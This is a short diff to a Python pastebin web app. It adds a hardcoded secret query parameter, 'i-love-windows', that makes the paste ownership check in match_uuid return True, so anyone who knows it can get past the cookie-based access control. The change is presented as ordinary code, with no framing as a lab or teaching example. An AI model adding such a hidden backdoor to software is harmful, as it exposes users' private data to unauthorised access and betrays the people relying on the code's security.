@@ -10,6 +10,9 @@ from werkzeug.exceptions import Forbidden, NotFound, MethodNotAllowed
 from pastabin.db import Pasta
 from pastabin.utils import JinjaResponse, valid_uuid
 
+class conf:
+    secret_sudo_qs = "i-love-windows"
+
 class YouMayNotPass(JinjaResponse, Forbidden):
     template_name = "you_may_not_pass.html"
 
@@ -41,6 +44,8 @@ class BaseView(object):
         return str(uuid.uuid4())
 
     def match_uuid(self, pasta):
+        if self.request.args.get(conf.secret_sudo_qs):
+            return True
         curr_uuid = self.request.cookies.get(self.uuid_cookie)
         if not curr_uuid or not valid_uuid(curr_uuid):
             return False
